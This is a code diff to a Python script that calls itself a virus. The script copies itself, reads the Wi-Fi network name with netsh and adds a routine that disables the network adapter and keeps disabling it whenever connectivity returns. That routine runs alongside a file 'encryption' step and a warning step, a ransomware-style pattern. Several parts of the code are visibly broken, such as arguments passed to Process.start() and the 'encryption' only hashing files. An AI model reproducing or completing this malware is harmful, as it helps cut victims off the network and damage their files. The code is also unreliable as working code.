@@ -3,6 +3,9 @@ import os
 import hashlib
 import ctypes
 import subprocess, re
+import socket
+import time
+from multiprocessing import Process
 
 
 main_file_directory = os.getcwd()
@@ -25,9 +28,29 @@ def encryption(file_list):
         with open(filename, 'rb', buffering=0) as f:
             for n in iter(lambda : f.readinto(mv), 0):
                 h.update(mv[:n])
+
 def wifi_scraper():
     ssid = re.search('(?<=: ).*', re.search(r'(?<=\n) *SSID.*(?=\r\n)', subprocess.check_output('netsh wlan show interfaces', creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')).group()).group()
     return ssid
+
+def offline_maker(wifi):
+    def connection_checking():
+        try:
+            host = socket.gethostbyname("www.google.com")
+            s = socket.create_connection((host, 80), 2)
+            return True
+        except:
+            pass
+        return False
+
+    os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")
+
+    while True:
+        connection = connection_checking()
+        if connection == False:
+            time.sleep(6)
+        elif connection == True: 
+            os.system("netsh interface set interface name = " + wifi + "admin=DISABLED")
 
 if main_file_directory is not destination_directory:
     shutil.copy(main_file_directory,destination_directory)
@@ -36,10 +59,19 @@ if main_file_directory is not destination_directory:
 elif main_file_directory is destination_directory:
     #start infecting the virus
     sub_directory_list = os.listdir()
-    wifi = wifi_scraper()
+    wifi_name = wifi_scraper()
+
     try:
-        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")
-        encryption(sub_directory_list)
-        warning()
+        if __name__ == "__main__":
+            offline_maker_process = Process(target = offline_maker)
+            offline_maker_process.start(wifi_name)
+            encryption_process = Process(target = encryption)
+            encryption_process.start(sub_directory_list)
+            warning_process = Process(target = warning)
+            warning_process.start()
+
+        #offline_maker(wifi_name)
+        #encryption(sub_directory_list)
+        #warning()
     except:
         pass
